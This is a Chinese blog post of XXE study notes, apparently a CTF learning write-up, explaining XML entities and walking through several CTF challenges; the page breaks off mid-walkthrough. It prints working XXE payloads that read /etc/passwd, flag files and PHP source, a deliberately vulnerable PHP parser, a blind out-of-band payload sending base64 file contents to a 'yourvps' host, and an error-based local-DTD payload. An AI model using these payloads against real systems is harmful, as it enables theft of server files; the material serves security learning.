<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctf"><meta name="keywords" content="xxe"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>XXE总结笔记 | Somnus's blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是XXE"><span class="toc-number">1.</span> <span class="toc-text">什么是XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML实体"><span class="toc-number">2.</span> <span class="toc-text">XML实体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#外部实体与内部实体"><span class="toc-number">2.1.</span> <span class="toc-text">外部实体与内部实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一般实体和参数实体"><span class="toc-number">2.2.</span> <span class="toc-text">一般实体和参数实体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE利用"><span class="toc-number">3.</span> <span class="toc-text">XXE利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#有回显的xxe"><span class="toc-number">3.1.</span> <span class="toc-text">有回显的xxe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无回显的xxe"><span class="toc-number">3.2.</span> <span class="toc-text">无回显的xxe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctf例题"><span class="toc-number">4.</span> <span class="toc-text">ctf例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#api调用"><span class="toc-number">4.1.</span> <span class="toc-text">api调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#who-are-you"><span class="toc-number">4.2.</span> <span class="toc-text">who_are_you</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LookAround"><span class="toc-number">4.3.</span> <span class="toc-text">LookAround</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GoogleCTF2019-Quals-Bnv"><span class="toc-number">4.4.</span> <span class="toc-text">[GoogleCTF2019 Quals]Bnv</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE防御"><span class="toc-number">5.</span> <span class="toc-text">XXE防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">88</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">16</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">26</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a><a class="author-info-links__name text-center" href="https://glotozz.github.io/" target="_blank" rel="noopener">glotozz</a><a class="author-info-links__name text-center" href="http://dkk.ink" target="_blank" rel="noopener">dkk</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">XXE总结笔记</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-06</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web/">Web</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>XXE在现在比赛中出现的比较少，所以不是很熟练，趁着最近赶紧恶补一下XXE<a id="more"></a></p>
<h2 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h2><p>XXE：XML External Entity 即<strong>XML外部实体注入攻击</strong>。是由于程序在解析输入的XML数据时，解析了攻击者伪造的<strong>外部实体</strong>，通过<strong>外部实体SYSTEM</strong>请求本地文件uri，通过某种方式返回本地的文件内容，导致了XXE漏洞。漏洞形成的标志性函数：例如<strong>PHP</strong>中的<code>simplexml_load_string</code>或者<code>simplexml_load_file</code>，默认情况下都会解析外部实体。</p>
<h2 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h2><p>XML的基本语法与html很类似，与html的区别只在于XML主要用来<strong>传输</strong>和<strong>存储</strong>数据，而HTML则是用来<strong>显示</strong>数据</p>
<p>要了解XXE，主要关注的是xml实体的定义：<strong>DTD</strong></p>
<p>DTD的学习具体可以参考：<a href="https://www.w3school.com.cn/dtd/dtd_entities.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/dtd/dtd_entities.asp</a> </p>
<p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。 </p>
<p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="外部实体与内部实体"><a href="#外部实体与内部实体" class="headerlink" title="外部实体与内部实体"></a>外部实体与内部实体</h3><p>xml实体可以分为<strong>外部</strong>和<strong>内部</strong>实体</p>
<p>内部实体与外部实体的区别，从语法上来看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; //定义内部实体</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt; //定义外部实体</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "utf-8" ?&gt;</span> //xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [ //DTD部分</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY test1 "test1"&gt; //内部实体</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY test2 SYSTEM "http://example.com/1.dtd"&gt; //外部实体</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;test1;&amp;test2;<span class="tag">&lt;/<span class="name">test</span>&gt;</span> //xml部分</span><br></pre></td></tr></table></figure>

<h3 id="一般实体和参数实体"><a href="#一般实体和参数实体" class="headerlink" title="一般实体和参数实体"></a>一般实体和参数实体</h3><p>xml实体还可以分为<strong>一般</strong>和<strong>参数</strong>实体</p>
<p>（1）一般实体的声明：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code></p>
<p>引用一般实体的方法：<code>&amp;实体名词;</code></p>
<p>一般实体既可以在<strong>DTD部分</strong>中引用，也可以在<strong>XML部分</strong>中引用</p>
<p>（2）参数实体的声明：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code></p>
<p>引用参数实体的方法：<code>%实体名称;</code></p>
<p>参数实体<strong>只能</strong>在<strong>DTD部分</strong>中引用</p>
<p>示例：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "utf-8" ?&gt;</span> //xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [ //DTD部分</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY test1 "test1"&gt; //一般实体</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % test2 SYSTEM "file:///etc/passwd"&gt; //参数实体</span></span><br><span class="line"><span class="meta">	%test2; //引用参数实体</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;test1;<span class="tag">&lt;/<span class="name">test</span>&gt;</span> //xml部分</span><br></pre></td></tr></table></figure>

<p>另外参数实体还能嵌套定义，但是要注意内层定义的参数实体<code>%</code>需要进行<strong>HTML转义</strong>，否则会出现解析错误</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % para '&lt;!ENTITY &amp;#x25; files SYSTEM "file:///etc/passwd"&gt;'&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h2><p>漏洞利用的简单靶机在线环境：<a href="https://www.vulnspy.com/phpaudit-xxe/" target="_blank" rel="noopener">https://www.vulnspy.com/phpaudit-xxe/</a> </p>
<h3 id="有回显的xxe"><a href="#有回显的xxe" class="headerlink" title="有回显的xxe"></a>有回显的xxe</h3><p>首先准备一个简单的具有XXE漏洞的php文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $xml = simplexml_load_string($data, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($xml);</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> htmlspecialchars($resp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码很简单，漏洞的触发点就是<code>simplexml_load_string</code>这个函数，他能允许我们通过DTD来定义外部实体</p>
<p>写入payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单的定义了一个外部实体<strong>test</strong>，通过<strong>file</strong>协议来读取服务器端本机的文件</p>
<p><img src="../../../../img/xxe/1.png" alt=""></p>
<p>因为服务器端代码：<code>echo htmlspecialchars($resp);</code>，所以执行的结果能回显</p>
<h3 id="无回显的xxe"><a href="#无回显的xxe" class="headerlink" title="无回显的xxe"></a>无回显的xxe</h3><p>既然上面的例子是因为<code>echo htmlspecialchars($resp);</code>这句代码所以才有回显，那么把这段代码去掉，就变成了无回显。那么，是不是就不能进行xxe了呢，答案是否定的，虽然靶机没有返回给我们数据，但是我们可以把数据带到我们自己的服务器上。</p>
<p>靶机代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'s'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $xml = simplexml_load_string($data, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line">    <span class="keyword">if</span>($xml &amp;&amp; <span class="keyword">isset</span>($xml-&gt;name))&#123;</span><br><span class="line">        $name = $xml-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="keyword">isset</span>($name)?<span class="string">'ok'</span>:<span class="string">'error'</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/xxe/2.png" alt=""></p>
<p>可以看到，现在正常情况下，只会返回给我们ok，即有查询结果，但是不会告诉我们结果是什么</p>
<p>我们传入如下的payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % dtd SYSTEM "http://yourvps/evil.xml"&gt;</span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在自己的vps上的<strong>evil.xml</strong>写入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://yourvps/?content=%file;&apos;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>

<p>注意，因为这里是参数实体<strong>payload</strong>来<strong>嵌套定义</strong>参数实体<strong>send</strong>，所以被<strong>嵌套定义</strong>的参数实体<code>%</code>一定要HTML编码为：<code>&amp;#x25;</code></p>
<p>如此一来，调用的过程就变成了：参数实体<strong>dtd</strong>通过<strong>http</strong>协议来访问vps上的<strong>evil.xml</strong>，然后返回<strong>evil.xml</strong>的内容，调用了参数实体<strong>payload</strong>，然后<strong>payload</strong>又调用了参数实体<strong>send</strong>，<strong>send</strong>的作用就是把参数实体<strong>file</strong>（即文件<strong>/etc/passwd</strong>的base64编码内容）发送到我们的vps上</p>
<p><img src="../../../../img/xxe/3.png" alt=""></p>
<p>那么为什么不能把<code>&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://yourvps/?content=%file;&#39;&gt;</code>payload的DTD里呢，这是因为：在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： <code>PEReferences forbidden in internal subset</code>。 所以，参数实体引用<code>%file;</code>必须放在外部文件里 。</p>
<p>但是，如果目标靶机不允许我们访问外网，那么就需要用到另一种方法：利用本地dtd文件重新定义参数实体产生报错从而回显信息。这种方法我们后面结合实际例题来说明。</p>
<h2 id="ctf例题"><a href="#ctf例题" class="headerlink" title="ctf例题"></a>ctf例题</h2><h3 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h3><p>题目地址：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a> </p>
<p>抓包发现提交的是json数据</p>
<p><img src="../../../../img/xxe/4.png" alt=""></p>
<p>那么就很存在xxe，先试着看看能不能解析xml标签</p>
<p>修改头部字段：<code>Content-Type: application/xml</code>，然后任意发送标签<code>&lt;a&gt;123&lt;/a&gt;</code></p>
<p><img src="../../../../img/xxe/5.png" alt=""></p>
<p>发现服务器成功解析，说明是有回显的xxe，那么直接发送读取flag文件的payload即可：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY name SYSTEM "file:///home/ctf/flag.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/xxe/6.png" alt=""></p>
<h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who_are_you"></a>who_are_you</h3><p>题目来源：2019 网络与信息安全领域专项赛线上赛</p>
<p>查看源码发现了xml提交的请求</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">            <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到xml自然就想到了尝试xxe攻击，</p>
<p>不过要注意这里规定了提交标签的格式要带有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&lt;feedback&gt;&apos;+&apos;&lt;author&gt;&apos;+document.getElementById(&apos;name&apos;).value+ &apos;&lt;/author&gt;&apos; +  &apos;&lt;/feedback&gt;&apos;;</span><br></pre></td></tr></table></figure>

<p>所以构造payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE author[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">feedback</span>&gt;</span><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">author</span>&gt;</span><span class="tag">&lt;/<span class="name">feedback</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/xxe/13.png" alt=""></p>
<p>但是尝试了file:///var/www/html/index.php等路径读不到index.php</p>
<p>于是就想到用php伪协议来读源码，就不需要知道绝对路径了</p>
<p>payload如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE author[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY name SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">feedback</span>&gt;</span><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">author</span>&gt;</span><span class="tag">&lt;/<span class="name">feedback</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/xxe/14.png" alt=""></p>
<p><img src="../../../../img/xxe/15.png" alt=""></p>
<p>读完base64解码后发现flag就在源码里面</p>
<h3 id="LookAround"><a href="#LookAround" class="headerlink" title="LookAround"></a>LookAround</h3><p>题目来源：2019 ogeek ctf线上赛</p>
<p>查看源码发现有个后台定时发送xml数据</p>
<p><img src="../../../../img/xxe/16.png" alt=""></p>
<p>应该是考察xxe</p>
<p>尝试分别读取存在和不存在的文件，发现不存在时有报错信息，存在时没有回显信息</p>
<p><img src="../../../../img/xxe/17.png" alt=""></p>
<p><img src="../../../../img/xxe/18.png" alt=""></p>
<p>既然有查询到结果却没有回显，说明这题是考察<strong>blind xxe</strong></p>
<p>blind xxe思想就是将数据通过外部服务器或者报错信息带出来</p>
<p>首先尝试<strong>http</strong>协议，发现访问不了外部服务器，会出现超时的情况</p>
<p><img src="../../../../img/xxe/19.png" alt=""></p>
<p>那么只能考虑第二种，利用<strong>本地dtd</strong>文件重新定义其内部参数实体引起报错，通过<strong>报错信息</strong>带出我们想要的数据</p>
<p>首先就要猜出本地dtd文件的绝对路径</p>
<p>参考：<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p>
<p><img src="../../../../img/xxe/20.png" alt=""></p>
<p>将里面的所有dtd文件的绝对路径尝试一遍，发现了本题dtd文件路径：</p>
<p><strong>/usr/share/xml/fontconfig/fonts.dtd</strong></p>
<p>重新定义其中的参数实体<strong>expr</strong>，然后在该实体中调用一个参数实体<strong>eval</strong>，<strong>eval</strong>再调用一个参数实体<strong>error</strong>通过<strong>file</strong>协议访问一个不存在的文件，产生<strong>报错信息</strong>。报错信息中就包含了参数实体<strong>file</strong>读取我们需要文件的内容，payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % expr 'aaa)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///FILE_TO_READ"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT aa (bb'&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/xxe/21.png" alt=""></p>
<p>flag就在报错信息中</p>
<h3 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h3><p>复现地址：<a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn</a> </p>
<p>在源码的<strong>post.js</strong>中发现了xml请求代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var url = &apos;/api/search&apos;;</span><br><span class="line">xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&apos;POST&apos;, url, true);</span><br><span class="line">xhr.setRequestHeader(&apos;Content-type&apos;, &apos;application/json&apos;);</span><br></pre></td></tr></table></figure>

<p>抓包仍然是提交一个json数据，</p>
<p><img src="../../../../img/xxe/7.png" alt=""></p>
<p>老办法，先修改头部字段<code>Content-Type: application/xml</code>，然后试着通过DTD去声明一个<strong>message</strong>元素：</p>
